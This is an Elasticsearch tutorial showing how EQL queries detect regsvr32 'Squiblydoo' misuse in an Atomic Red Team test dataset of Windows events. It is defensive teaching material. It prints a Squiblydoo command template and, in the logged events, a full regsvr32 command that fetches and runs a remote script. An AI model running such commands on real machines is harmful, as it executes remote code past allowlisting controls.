---
mapped_pages:
  - https://www.elastic.co/guide/en/elasticsearch/reference/current/eql-ex-threat-detection.html
---

# Example: Detect threats with EQL [eql-ex-threat-detection]

This example tutorial shows how you can use EQL to detect security threats and other suspicious behavior. In the scenario, you’re tasked with detecting [regsvr32 misuse](https://attack.mitre.org/techniques/T1218/010/) in Windows event logs.

`regsvr32.exe` is a built-in command-line utility used to register `.dll` libraries in Windows. As a native tool, `regsvr32.exe` has a trusted status, letting it bypass most allowlist software and script blockers. Attackers with access to a user’s command line can use `regsvr32.exe` to run malicious scripts via `.dll` libraries, even on machines that otherwise disallow such scripts.

One common variant of regsvr32 misuse is a [Squiblydoo attack](https://attack.mitre.org/techniques/T1218/010/). In a Squiblydoo attack, a `regsvr32.exe` command uses the `scrobj.dll` library to register and run a remote script. These commands often look like this:

```sh
"regsvr32.exe  /s /u /i:<script-url> scrobj.dll"
```


## Setup [eql-ex-threat-detection-setup]

This tutorial uses a test dataset from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) that includes events imitating a Squiblydoo attack. The data has been mapped to [Elastic Common Schema (ECS)][Elastic Common Schema (ECS)](ecs://reference/index.md)) fields.

To get started:

1. Create an [index template](docs-content://manage-data/data-store/templates.md) with [data stream enabled](docs-content://manage-data/data-store/data-streams/set-up-data-stream.md#create-index-template):

    ```console
    PUT /_index_template/my-data-stream-template
    {
      "index_patterns": [ "my-data-stream*" ],
      "data_stream": { },
      "priority": 500
    }
    ```

2. Download [`normalized-T1117-AtomicRed-regsvr32.json`](https://raw.githubusercontent.com/elastic/elasticsearch/master/docs/src/yamlRestTest/resources/normalized-T1117-AtomicRed-regsvr32.json).
3. Use the [bulk API](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-bulk) to index the data to a matching stream:

    ```sh
    curl -H "Content-Type: application/json" -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" --data-binary "@normalized-T1117-AtomicRed-regsvr32.json"
    ```

4. Use the [cat indices API](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-cat-indices) to verify the data was indexed:

    ```console
    GET /_cat/indices/my-data-stream?v=true&h=health,status,index,docs.count
    ```

    The response should show a `docs.count` of `150`.

    ```txt
    health status index                                 docs.count
    yellow open   .ds-my-data-stream-2099.12.07-000001         150
    ```



## Get a count of regsvr32 events [eql-ex-get-a-count-of-regsvr32-events]

First, get a count of events associated with a `regsvr32.exe` process:

```console
GET /my-data-stream/_eql/search?filter_path=-hits.events    <1>
{
  "query": """
    any where process.name == "regsvr32.exe"                <2>
  """,
  "size": 200                                               <3>
}
```

1. `?filter_path=-hits.events` excludes the `hits.events` property from the response. This search is only intended to get an event count, not a list of matching events.
2. Matches any event with a `process.name` of `regsvr32.exe`.
3. Returns up to 200 hits for matching events.


The response returns 143 related events.

```console-result
{
  "is_partial": false,
  "is_running": false,
  "took": 60,
  "timed_out": false,
  "hits": {
    "total": {
      "value": 143,
      "relation": "eq"
    }
  }
}
```


## Check for command line artifacts [eql-ex-check-for-command-line-artifacts]

`regsvr32.exe` processes were associated with 143 events. But how was `regsvr32.exe` first called? And who called it? `regsvr32.exe` is a command-line utility. Narrow your results to processes where the command line was used:

```console
GET /my-data-stream/_eql/search
{
  "query": """
    process where process.name == "regsvr32.exe" and process.command_line.keyword != null
  """
}
```

The query matches one event with an `event.type` of `creation`, indicating the start of a `regsvr32.exe` process. Based on the event’s `process.command_line` value, `regsvr32.exe` used `scrobj.dll` to register a script, `RegSvr32.sct`. This fits the behavior of a Squiblydoo attack.

```console-result
{
  ...
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "events": [
      {
        "_index": ".ds-my-data-stream-2099.12.07-000001",
        "_id": "gl5MJXMBMk1dGnErnBW8",
        "_source": {
          "process": {
            "parent": {
              "name": "cmd.exe",
              "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
              "executable": "C:\\Windows\\System32\\cmd.exe"
            },
            "name": "regsvr32.exe",
            "pid": 2012,
            "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
            "executable": "C:\\Windows\\System32\\regsvr32.exe",
            "ppid": 2652
          },
          "logon_id": 217055,
          "@timestamp": 131883573237130000,
          "event": {
            "category": "process",
            "type": "creation"
          },
          "user": {
            "full_name": "bob",
            "domain": "ART-DESKTOP",
            "id": "ART-DESKTOP\\bob"
          }
        }
      }
    ]
  }
}
```


## Check for malicious script loads [eql-ex-check-for-malicious-script-loads]

Check if `regsvr32.exe` later loads the `scrobj.dll` library:

```console
GET /my-data-stream/_eql/search
{
  "query": """
    library where process.name == "regsvr32.exe" and dll.name == "scrobj.dll"
  """
}
```

The query matches an event, confirming `scrobj.dll` was loaded.

```console-result
{
  ...
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "events": [
      {
        "_index": ".ds-my-data-stream-2099.12.07-000001",
        "_id": "ol5MJXMBMk1dGnErnBW8",
        "_source": {
          "process": {
            "name": "regsvr32.exe",
            "pid": 2012,
            "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "executable": "C:\\Windows\\System32\\regsvr32.exe"
          },
          "@timestamp": 131883573237450016,
          "dll": {
            "path": "C:\\Windows\\System32\\scrobj.dll",
            "name": "scrobj.dll"
          },
          "event": {
            "category": "library"
          }
        }
      }
    ]
  }
}
```


## Determine the likelihood of success [eql-ex-detemine-likelihood-of-success]

In many cases, attackers use malicious scripts to connect to remote servers or download other files. Use an [EQL sequence query](/reference/query-languages/eql/eql-syntax.md#eql-sequences) to check for the following series of events:

1. A `regsvr32.exe` process
2. A load of the `scrobj.dll` library by the same process
3. Any network event by the same process

Based on the command line value seen in the previous response, you can expect to find a match. However, this query isn’t designed for that specific command. Instead, it looks for a pattern of suspicious behavior that’s generic enough to detect similar threats.

```console
GET /my-data-stream/_eql/search
{
  "query": """
    sequence by process.pid
      [process where process.name == "regsvr32.exe"]
      [library where dll.name == "scrobj.dll"]
      [network where true]
  """
}
```

The query matches a sequence, indicating the attack likely succeeded.

```console-result
{
  ...
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "sequences": [
      {
        "join_keys": [
          2012
        ],
        "events": [
          {
            "_index": ".ds-my-data-stream-2099.12.07-000001",
            "_id": "gl5MJXMBMk1dGnErnBW8",
            "_source": {
              "process": {
                "parent": {
                  "name": "cmd.exe",
                  "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
                  "executable": "C:\\Windows\\System32\\cmd.exe"
                },
                "name": "regsvr32.exe",
                "pid": 2012,
                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
                "executable": "C:\\Windows\\System32\\regsvr32.exe",
                "ppid": 2652
              },
              "logon_id": 217055,
              "@timestamp": 131883573237130000,
              "event": {
                "category": "process",
                "type": "creation"
              },
              "user": {
                "full_name": "bob",
                "domain": "ART-DESKTOP",
                "id": "ART-DESKTOP\\bob"
              }
            }
          },
          {
            "_index": ".ds-my-data-stream-2099.12.07-000001",
            "_id": "ol5MJXMBMk1dGnErnBW8",
            "_source": {
              "process": {
                "name": "regsvr32.exe",
                "pid": 2012,
                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable": "C:\\Windows\\System32\\regsvr32.exe"
              },
              "@timestamp": 131883573237450016,
              "dll": {
                "path": "C:\\Windows\\System32\\scrobj.dll",
                "name": "scrobj.dll"
              },
              "event": {
                "category": "library"
              }
            }
          },
          {
            "_index": ".ds-my-data-stream-2099.12.07-000001",
            "_id": "EF5MJXMBMk1dGnErnBa9",
            "_source": {
              "process": {
                "name": "regsvr32.exe",
                "pid": 2012,
                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable": "C:\\Windows\\System32\\regsvr32.exe"
              },
              "@timestamp": 131883573238680000,
              "destination": {
                "address": "151.101.48.133",
                "port": "443"
              },
              "source": {
                "address": "192.168.162.134",
                "port": "50505"
              },
              "event": {
                "category": "network"
              },
              "user": {
                "full_name": "bob",
                "domain": "ART-DESKTOP",
                "id": "ART-DESKTOP\\bob"
              },
              "network": {
                "protocol": "tcp",
                "direction": "outbound"
              }
            }
          }
        ]
      }
    ]
  }
}
```

